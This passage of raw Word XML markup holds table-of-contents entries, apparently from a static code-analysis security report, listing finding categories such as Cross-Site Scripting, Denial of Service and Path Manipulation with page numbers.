              </w:rPr>
            </w:r>
            <w:r w:rsidR="002039E1">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="separate"/>
            </w:r>
            <w:r w:rsidR="002039E1">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:t>11</w:t>
            </w:r>
            <w:r w:rsidR="002039E1">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="end"/>
            </w:r>
          </w:hyperlink>
        </w:p>
        <w:p w14:paraId="65174A27" w14:textId="45ED05E7" w:rsidR="002039E1" w:rsidRDefault="004E7FC7">
          <w:pPr>
            <w:pStyle w:val="Sommario3"/>
            <w:tabs>
              <w:tab w:val="left" w:pos="1440"/>
              <w:tab w:val="right" w:leader="dot" w:pos="9019"/>
            </w:tabs>
            <w:rPr>
              <w:noProof/>
            </w:rPr>
          </w:pPr>
          <w:hyperlink w:anchor="_Toc200039250" w:history="1">
            <w:r w:rsidR="002039E1" w:rsidRPr="00491B49">
              <w:rPr>
                <w:rStyle w:val="Collegamentoipertestuale"/>
                <w:noProof/>
              </w:rPr>
              <w:t>1.1.6.</w:t>
            </w:r>
            <w:r w:rsidR="002039E1">
              <w:rPr>
                <w:noProof/>
              </w:rPr>
              <w:tab/>
            </w:r>
            <w:r w:rsidR="002039E1" w:rsidRPr="00491B49">
              <w:rPr>
                <w:rStyle w:val="Collegamentoipertestuale"/>
                <w:noProof/>
              </w:rPr>
              <w:t>Cross-Site Request Forgery</w:t>
            </w:r>
            <w:r w:rsidR="002039E1">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:tab/>
            </w:r>
            <w:r w:rsidR="002039E1">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="begin"/>
            </w:r>
            <w:r w:rsidR="002039E1">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:instrText xml:space="preserve"> PAGEREF _Toc200039250 \h </w:instrText>
            </w:r>
            <w:r w:rsidR="002039E1">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
            </w:r>
            <w:r w:rsidR="002039E1">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="separate"/>
            </w:r>
            <w:r w:rsidR="002039E1">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:t>11</w:t>
            </w:r>
            <w:r w:rsidR="002039E1">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="end"/>
            </w:r>
          </w:hyperlink>
        </w:p>
        <w:p w14:paraId="4984AE9B" w14:textId="2B24F77A" w:rsidR="002039E1" w:rsidRDefault="004E7FC7">
          <w:pPr>
            <w:pStyle w:val="Sommario3"/>
            <w:tabs>
              <w:tab w:val="left" w:pos="1440"/>
              <w:tab w:val="right" w:leader="dot" w:pos="9019"/>
            </w:tabs>
            <w:rPr>
              <w:noProof/>
            </w:rPr>
          </w:pPr>
          <w:hyperlink w:anchor="_Toc200039251" w:history="1">
            <w:r w:rsidR="002039E1" w:rsidRPr="00491B49">
              <w:rPr>
                <w:rStyle w:val="Collegamentoipertestuale"/>
                <w:noProof/>
              </w:rPr>
              <w:t>1.1.7.</w:t>
            </w:r>
            <w:r w:rsidR="002039E1">
              <w:rPr>
                <w:noProof/>
              </w:rPr>
              <w:tab/>
            </w:r>
            <w:r w:rsidR="002039E1" w:rsidRPr="00491B49">
              <w:rPr>
                <w:rStyle w:val="Collegamentoipertestuale"/>
                <w:noProof/>
              </w:rPr>
              <w:t>Cross-Site Scripting: DOM</w:t>
            </w:r>
            <w:r w:rsidR="002039E1">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:tab/>
            </w:r>
            <w:r w:rsidR="002039E1">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="begin"/>
            </w:r>
            <w:r w:rsidR="002039E1">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:instrText xml:space="preserve"> PAGEREF _Toc200039251 \h </w:instrText>
            </w:r>
            <w:r w:rsidR="002039E1">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
            </w:r>
            <w:r w:rsidR="002039E1">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="separate"/>
            </w:r>
            <w:r w:rsidR="002039E1">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:t>11</w:t>
            </w:r>
            <w:r w:rsidR="002039E1">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="end"/>
            </w:r>
          </w:hyperlink>
        </w:p>
        <w:p w14:paraId="022B547E" w14:textId="2AE6AB6D" w:rsidR="002039E1" w:rsidRDefault="004E7FC7">
          <w:pPr>
            <w:pStyle w:val="Sommario3"/>
            <w:tabs>
              <w:tab w:val="left" w:pos="1440"/>
              <w:tab w:val="right" w:leader="dot" w:pos="9019"/>
            </w:tabs>
            <w:rPr>
              <w:noProof/>
            </w:rPr>
          </w:pPr>
          <w:hyperlink w:anchor="_Toc200039252" w:history="1">
            <w:r w:rsidR="002039E1" w:rsidRPr="00491B49">
              <w:rPr>
                <w:rStyle w:val="Collegamentoipertestuale"/>
                <w:noProof/>
              </w:rPr>
              <w:t>1.1.8.</w:t>
            </w:r>
            <w:r w:rsidR="002039E1">
              <w:rPr>
                <w:noProof/>
              </w:rPr>
              <w:tab/>
            </w:r>
            <w:r w:rsidR="002039E1" w:rsidRPr="00491B49">
              <w:rPr>
                <w:rStyle w:val="Collegamentoipertestuale"/>
                <w:noProof/>
              </w:rPr>
              <w:t>Cross-Site Scripting: Self</w:t>
            </w:r>
            <w:r w:rsidR="002039E1">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:tab/>
            </w:r>
            <w:r w:rsidR="002039E1">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="begin"/>
            </w:r>
            <w:r w:rsidR="002039E1">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:instrText xml:space="preserve"> PAGEREF _Toc200039252 \h </w:instrText>
            </w:r>
            <w:r w:rsidR="002039E1">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
            </w:r>
            <w:r w:rsidR="002039E1">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="separate"/>
            </w:r>
            <w:r w:rsidR="002039E1">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:t>12</w:t>
            </w:r>
            <w:r w:rsidR="002039E1">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="end"/>
            </w:r>
          </w:hyperlink>
        </w:p>
        <w:p w14:paraId="535513A1" w14:textId="476CBBB5" w:rsidR="002039E1" w:rsidRDefault="004E7FC7">
          <w:pPr>
            <w:pStyle w:val="Sommario3"/>
            <w:tabs>
              <w:tab w:val="left" w:pos="1440"/>
              <w:tab w:val="right" w:leader="dot" w:pos="9019"/>
            </w:tabs>
            <w:rPr>
              <w:noProof/>
            </w:rPr>
          </w:pPr>
          <w:hyperlink w:anchor="_Toc200039253" w:history="1">
            <w:r w:rsidR="002039E1" w:rsidRPr="00491B49">
              <w:rPr>
                <w:rStyle w:val="Collegamentoipertestuale"/>
                <w:noProof/>
              </w:rPr>
              <w:t>1.1.9.</w:t>
            </w:r>
            <w:r w:rsidR="002039E1">
              <w:rPr>
                <w:noProof/>
              </w:rPr>
              <w:tab/>
            </w:r>
            <w:r w:rsidR="002039E1" w:rsidRPr="00491B49">
              <w:rPr>
                <w:rStyle w:val="Collegamentoipertestuale"/>
                <w:noProof/>
              </w:rPr>
              <w:t>Dead Code: Expression is Always true</w:t>
            </w:r>
            <w:r w:rsidR="002039E1">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:tab/>
            </w:r>
            <w:r w:rsidR="002039E1">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="begin"/>
            </w:r>
            <w:r w:rsidR="002039E1">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:instrText xml:space="preserve"> PAGEREF _Toc200039253 \h </w:instrText>
            </w:r>
            <w:r w:rsidR="002039E1">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
            </w:r>
            <w:r w:rsidR="002039E1">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="separate"/>
            </w:r>
            <w:r w:rsidR="002039E1">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:t>12</w:t>
            </w:r>
            <w:r w:rsidR="002039E1">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="end"/>
            </w:r>
          </w:hyperlink>
        </w:p>
        <w:p w14:paraId="01DEE7A1" w14:textId="6D718A94" w:rsidR="002039E1" w:rsidRDefault="004E7FC7">
          <w:pPr>
            <w:pStyle w:val="Sommario3"/>
            <w:tabs>
              <w:tab w:val="left" w:pos="1440"/>
              <w:tab w:val="right" w:leader="dot" w:pos="9019"/>
            </w:tabs>
            <w:rPr>
              <w:noProof/>
            </w:rPr>
          </w:pPr>
          <w:hyperlink w:anchor="_Toc200039254" w:history="1">
            <w:r w:rsidR="002039E1" w:rsidRPr="00491B49">
              <w:rPr>
                <w:rStyle w:val="Collegamentoipertestuale"/>
                <w:noProof/>
              </w:rPr>
              <w:t>1.1.10.</w:t>
            </w:r>
            <w:r w:rsidR="002039E1">
              <w:rPr>
                <w:noProof/>
              </w:rPr>
              <w:tab/>
            </w:r>
            <w:r w:rsidR="002039E1" w:rsidRPr="00491B49">
              <w:rPr>
                <w:rStyle w:val="Collegamentoipertestuale"/>
                <w:noProof/>
              </w:rPr>
              <w:t>Denial of Service</w:t>
            </w:r>
            <w:r w:rsidR="002039E1">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:tab/>
            </w:r>
            <w:r w:rsidR="002039E1">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="begin"/>
            </w:r>
            <w:r w:rsidR="002039E1">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:instrText xml:space="preserve"> PAGEREF _Toc200039254 \h </w:instrText>
            </w:r>
            <w:r w:rsidR="002039E1">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
            </w:r>
            <w:r w:rsidR="002039E1">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="separate"/>
            </w:r>
            <w:r w:rsidR="002039E1">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:t>12</w:t>
            </w:r>
            <w:r w:rsidR="002039E1">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="end"/>
            </w:r>
          </w:hyperlink>
        </w:p>
        <w:p w14:paraId="5F68B153" w14:textId="03AA2938" w:rsidR="002039E1" w:rsidRDefault="004E7FC7">
          <w:pPr>
            <w:pStyle w:val="Sommario3"/>
            <w:tabs>
              <w:tab w:val="left" w:pos="1440"/>
              <w:tab w:val="right" w:leader="dot" w:pos="9019"/>
            </w:tabs>
            <w:rPr>
              <w:noProof/>
            </w:rPr>
          </w:pPr>
          <w:hyperlink w:anchor="_Toc200039255" w:history="1">
            <w:r w:rsidR="002039E1" w:rsidRPr="00491B49">
              <w:rPr>
                <w:rStyle w:val="Collegamentoipertestuale"/>
                <w:noProof/>
              </w:rPr>
              <w:t>1.1.11.</w:t>
            </w:r>
            <w:r w:rsidR="002039E1">
              <w:rPr>
                <w:noProof/>
              </w:rPr>
              <w:tab/>
            </w:r>
            <w:r w:rsidR="002039E1" w:rsidRPr="00491B49">
              <w:rPr>
                <w:rStyle w:val="Collegamentoipertestuale"/>
                <w:noProof/>
              </w:rPr>
              <w:t>Denial of Service: StringBuilder</w:t>
            </w:r>
            <w:r w:rsidR="002039E1">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:tab/>
            </w:r>
            <w:r w:rsidR="002039E1">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="begin"/>
            </w:r>
            <w:r w:rsidR="002039E1">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:instrText xml:space="preserve"> PAGEREF _Toc200039255 \h </w:instrText>
            </w:r>
            <w:r w:rsidR="002039E1">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
            </w:r>
            <w:r w:rsidR="002039E1">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="separate"/>
            </w:r>
            <w:r w:rsidR="002039E1">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:t>12</w:t>
            </w:r>
            <w:r w:rsidR="002039E1">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="end"/>
            </w:r>
          </w:hyperlink>
        </w:p>
        <w:p w14:paraId="4E67B2F1" w14:textId="4543807A" w:rsidR="002039E1" w:rsidRDefault="004E7FC7">
          <w:pPr>
            <w:pStyle w:val="Sommario3"/>
            <w:tabs>
              <w:tab w:val="left" w:pos="1440"/>
              <w:tab w:val="right" w:leader="dot" w:pos="9019"/>
            </w:tabs>
            <w:rPr>
              <w:noProof/>
            </w:rPr>
          </w:pPr>
          <w:hyperlink w:anchor="_Toc200039256" w:history="1">
            <w:r w:rsidR="002039E1" w:rsidRPr="00491B49">
              <w:rPr>
                <w:rStyle w:val="Collegamentoipertestuale"/>
                <w:noProof/>
              </w:rPr>
              <w:t>1.1.12.</w:t>
            </w:r>
            <w:r w:rsidR="002039E1">
              <w:rPr>
                <w:noProof/>
              </w:rPr>
              <w:tab/>
            </w:r>
            <w:r w:rsidR="002039E1" w:rsidRPr="00491B49">
              <w:rPr>
                <w:rStyle w:val="Collegamentoipertestuale"/>
                <w:noProof/>
              </w:rPr>
              <w:t>Insecure Randomness</w:t>
            </w:r>
            <w:r w:rsidR="002039E1">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:tab/>
            </w:r>
            <w:r w:rsidR="002039E1">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="begin"/>
            </w:r>
            <w:r w:rsidR="002039E1">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:instrText xml:space="preserve"> PAGEREF _Toc200039256 \h </w:instrText>
            </w:r>
            <w:r w:rsidR="002039E1">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
            </w:r>
            <w:r w:rsidR="002039E1">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="separate"/>
            </w:r>
            <w:r w:rsidR="002039E1">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:t>12</w:t>
            </w:r>
            <w:r w:rsidR="002039E1">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="end"/>
            </w:r>
          </w:hyperlink>
        </w:p>
        <w:p w14:paraId="7B48A6B5" w14:textId="5607129C" w:rsidR="002039E1" w:rsidRDefault="004E7FC7">
          <w:pPr>
            <w:pStyle w:val="Sommario3"/>
            <w:tabs>
              <w:tab w:val="left" w:pos="1440"/>
              <w:tab w:val="right" w:leader="dot" w:pos="9019"/>
            </w:tabs>
            <w:rPr>
              <w:noProof/>
            </w:rPr>
          </w:pPr>
          <w:hyperlink w:anchor="_Toc200039257" w:history="1">
            <w:r w:rsidR="002039E1" w:rsidRPr="00491B49">
              <w:rPr>
                <w:rStyle w:val="Collegamentoipertestuale"/>
                <w:noProof/>
              </w:rPr>
              <w:t>1.1.13.</w:t>
            </w:r>
            <w:r w:rsidR="002039E1">
              <w:rPr>
                <w:noProof/>
              </w:rPr>
              <w:tab/>
            </w:r>
            <w:r w:rsidR="002039E1" w:rsidRPr="00491B49">
              <w:rPr>
                <w:rStyle w:val="Collegamentoipertestuale"/>
                <w:noProof/>
              </w:rPr>
              <w:t>J2EE Bad Practices: Threads</w:t>
            </w:r>
            <w:r w:rsidR="002039E1">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:tab/>
            </w:r>
            <w:r w:rsidR="002039E1">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="begin"/>
            </w:r>
            <w:r w:rsidR="002039E1">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:instrText xml:space="preserve"> PAGEREF _Toc200039257 \h </w:instrText>
            </w:r>
            <w:r w:rsidR="002039E1">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
            </w:r>
            <w:r w:rsidR="002039E1">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="separate"/>
            </w:r>
            <w:r w:rsidR="002039E1">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:t>12</w:t>
            </w:r>
            <w:r w:rsidR="002039E1">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="end"/>
            </w:r>
          </w:hyperlink>
        </w:p>
        <w:p w14:paraId="2D3061D2" w14:textId="28BAE26E" w:rsidR="002039E1" w:rsidRDefault="004E7FC7">
          <w:pPr>
            <w:pStyle w:val="Sommario3"/>
            <w:tabs>
              <w:tab w:val="left" w:pos="1440"/>
              <w:tab w:val="right" w:leader="dot" w:pos="9019"/>
            </w:tabs>
            <w:rPr>
              <w:noProof/>
            </w:rPr>
          </w:pPr>
          <w:hyperlink w:anchor="_Toc200039258" w:history="1">
            <w:r w:rsidR="002039E1" w:rsidRPr="00491B49">
              <w:rPr>
                <w:rStyle w:val="Collegamentoipertestuale"/>
                <w:noProof/>
              </w:rPr>
              <w:t>1.1.14.</w:t>
            </w:r>
            <w:r w:rsidR="002039E1">
              <w:rPr>
                <w:noProof/>
              </w:rPr>
              <w:tab/>
            </w:r>
            <w:r w:rsidR="002039E1" w:rsidRPr="00491B49">
              <w:rPr>
                <w:rStyle w:val="Collegamentoipertestuale"/>
                <w:noProof/>
              </w:rPr>
              <w:t>Missing Check against Null</w:t>
            </w:r>
            <w:r w:rsidR="002039E1">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:tab/>
            </w:r>
            <w:r w:rsidR="002039E1">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="begin"/>
            </w:r>
            <w:r w:rsidR="002039E1">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:instrText xml:space="preserve"> PAGEREF _Toc200039258 \h </w:instrText>
            </w:r>
            <w:r w:rsidR="002039E1">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
            </w:r>
            <w:r w:rsidR="002039E1">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="separate"/>
            </w:r>
            <w:r w:rsidR="002039E1">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:t>13</w:t>
            </w:r>
            <w:r w:rsidR="002039E1">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="end"/>
            </w:r>
          </w:hyperlink>
        </w:p>
        <w:p w14:paraId="342576B4" w14:textId="04D7DB39" w:rsidR="002039E1" w:rsidRDefault="004E7FC7">
          <w:pPr>
            <w:pStyle w:val="Sommario3"/>
            <w:tabs>
              <w:tab w:val="left" w:pos="1440"/>
              <w:tab w:val="right" w:leader="dot" w:pos="9019"/>
            </w:tabs>
            <w:rPr>
              <w:noProof/>
            </w:rPr>
          </w:pPr>
          <w:hyperlink w:anchor="_Toc200039259" w:history="1">
            <w:r w:rsidR="002039E1" w:rsidRPr="00491B49">
              <w:rPr>
                <w:rStyle w:val="Collegamentoipertestuale"/>
                <w:noProof/>
              </w:rPr>
              <w:t>1.1.15.</w:t>
            </w:r>
            <w:r w:rsidR="002039E1">
              <w:rPr>
                <w:noProof/>
              </w:rPr>
              <w:tab/>
            </w:r>
            <w:r w:rsidR="002039E1" w:rsidRPr="00491B49">
              <w:rPr>
                <w:rStyle w:val="Collegamentoipertestuale"/>
                <w:noProof/>
              </w:rPr>
              <w:t>Object Model Violation: Erroneous clone() Method</w:t>
            </w:r>
            <w:r w:rsidR="002039E1">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:tab/>
            </w:r>
            <w:r w:rsidR="002039E1">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="begin"/>
            </w:r>
            <w:r w:rsidR="002039E1">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:instrText xml:space="preserve"> PAGEREF _Toc200039259 \h </w:instrText>
            </w:r>
            <w:r w:rsidR="002039E1">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
            </w:r>
            <w:r w:rsidR="002039E1">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="separate"/>
            </w:r>
            <w:r w:rsidR="002039E1">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:t>13</w:t>
            </w:r>
            <w:r w:rsidR="002039E1">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="end"/>
            </w:r>
          </w:hyperlink>
        </w:p>
        <w:p w14:paraId="1C47A0D3" w14:textId="585AE7B0" w:rsidR="002039E1" w:rsidRDefault="004E7FC7">
          <w:pPr>
            <w:pStyle w:val="Sommario3"/>
            <w:tabs>
              <w:tab w:val="left" w:pos="1440"/>
              <w:tab w:val="right" w:leader="dot" w:pos="9019"/>
            </w:tabs>
            <w:rPr>
              <w:noProof/>
            </w:rPr>
          </w:pPr>
          <w:hyperlink w:anchor="_Toc200039260" w:history="1">
            <w:r w:rsidR="002039E1" w:rsidRPr="00491B49">
              <w:rPr>
                <w:rStyle w:val="Collegamentoipertestuale"/>
                <w:noProof/>
              </w:rPr>
              <w:t>1.1.16.</w:t>
            </w:r>
            <w:r w:rsidR="002039E1">
              <w:rPr>
                <w:noProof/>
              </w:rPr>
              <w:tab/>
            </w:r>
            <w:r w:rsidR="002039E1" w:rsidRPr="00491B49">
              <w:rPr>
                <w:rStyle w:val="Collegamentoipertestuale"/>
                <w:noProof/>
              </w:rPr>
              <w:t>Object Model Violation: Just one of equals() and hashCode() Defined</w:t>
            </w:r>
            <w:r w:rsidR="002039E1">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:tab/>
            </w:r>
            <w:r w:rsidR="002039E1">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="begin"/>
            </w:r>
            <w:r w:rsidR="002039E1">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:instrText xml:space="preserve"> PAGEREF _Toc200039260 \h </w:instrText>
            </w:r>
            <w:r w:rsidR="002039E1">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
            </w:r>
            <w:r w:rsidR="002039E1">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="separate"/>
            </w:r>
            <w:r w:rsidR="002039E1">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:t>13</w:t>
            </w:r>
            <w:r w:rsidR="002039E1">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="end"/>
            </w:r>
          </w:hyperlink>
        </w:p>
        <w:p w14:paraId="02F1726F" w14:textId="7F58389D" w:rsidR="002039E1" w:rsidRDefault="004E7FC7">
          <w:pPr>
            <w:pStyle w:val="Sommario3"/>
            <w:tabs>
              <w:tab w:val="left" w:pos="1440"/>
              <w:tab w:val="right" w:leader="dot" w:pos="9019"/>
            </w:tabs>
            <w:rPr>
              <w:noProof/>
            </w:rPr>
          </w:pPr>
          <w:hyperlink w:anchor="_Toc200039261" w:history="1">
            <w:r w:rsidR="002039E1" w:rsidRPr="00491B49">
              <w:rPr>
                <w:rStyle w:val="Collegamentoipertestuale"/>
                <w:noProof/>
              </w:rPr>
              <w:t>1.1.17.</w:t>
            </w:r>
            <w:r w:rsidR="002039E1">
              <w:rPr>
                <w:noProof/>
              </w:rPr>
              <w:tab/>
            </w:r>
            <w:r w:rsidR="002039E1" w:rsidRPr="00491B49">
              <w:rPr>
                <w:rStyle w:val="Collegamentoipertestuale"/>
                <w:noProof/>
              </w:rPr>
              <w:t>Password Management: Password in Comment</w:t>
            </w:r>
            <w:r w:rsidR="002039E1">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:tab/>
            </w:r>
            <w:r w:rsidR="002039E1">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="begin"/>
            </w:r>
            <w:r w:rsidR="002039E1">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:instrText xml:space="preserve"> PAGEREF _Toc200039261 \h </w:instrText>
            </w:r>
            <w:r w:rsidR="002039E1">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
            </w:r>
            <w:r w:rsidR="002039E1">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="separate"/>
            </w:r>
            <w:r w:rsidR="002039E1">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:t>13</w:t>
            </w:r>
            <w:r w:rsidR="002039E1">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="end"/>
            </w:r>
          </w:hyperlink>
        </w:p>
        <w:p w14:paraId="03BFAD26" w14:textId="1BF3AA18" w:rsidR="002039E1" w:rsidRDefault="004E7FC7">
          <w:pPr>
            <w:pStyle w:val="Sommario3"/>
            <w:tabs>
              <w:tab w:val="left" w:pos="1440"/>
              <w:tab w:val="right" w:leader="dot" w:pos="9019"/>
            </w:tabs>
            <w:rPr>
              <w:noProof/>
            </w:rPr>
          </w:pPr>
          <w:hyperlink w:anchor="_Toc200039262" w:history="1">
            <w:r w:rsidR="002039E1" w:rsidRPr="00491B49">
              <w:rPr>
                <w:rStyle w:val="Collegamentoipertestuale"/>
                <w:noProof/>
              </w:rPr>
              <w:t>1.1.18.</w:t>
            </w:r>
            <w:r w:rsidR="002039E1">
              <w:rPr>
                <w:noProof/>
              </w:rPr>
              <w:tab/>
            </w:r>
            <w:r w:rsidR="002039E1" w:rsidRPr="00491B49">
              <w:rPr>
                <w:rStyle w:val="Collegamentoipertestuale"/>
                <w:noProof/>
              </w:rPr>
              <w:t>Path Manipulation</w:t>
            </w:r>
            <w:r w:rsidR="002039E1">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:tab/>
            </w:r>
            <w:r w:rsidR="002039E1">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="begin"/>
            </w:r>
            <w:r w:rsidR="002039E1">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:instrText xml:space="preserve"> PAGEREF _Toc200039262 \h </w:instrText>
            </w:r>
            <w:r w:rsidR="002039E1">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
            </w:r>
            <w:r w:rsidR="002039E1">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="separate"/>
            </w:r>
            <w:r w:rsidR="002039E1">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:t>13</w:t>
            </w:r>
            <w:r w:rsidR="002039E1">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="end"/>
            </w:r>
          </w:hyperlink>
        </w:p>
        <w:p w14:paraId="6B622D59" w14:textId="4294D9E1" w:rsidR="002039E1" w:rsidRDefault="004E7FC7">
          <w:pPr>
            <w:pStyle w:val="Sommario3"/>
            <w:tabs>
              <w:tab w:val="left" w:pos="1440"/>
              <w:tab w:val="right" w:leader="dot" w:pos="9019"/>
            </w:tabs>
            <w:rPr>
              <w:noProof/>
            </w:rPr>
          </w:pPr>
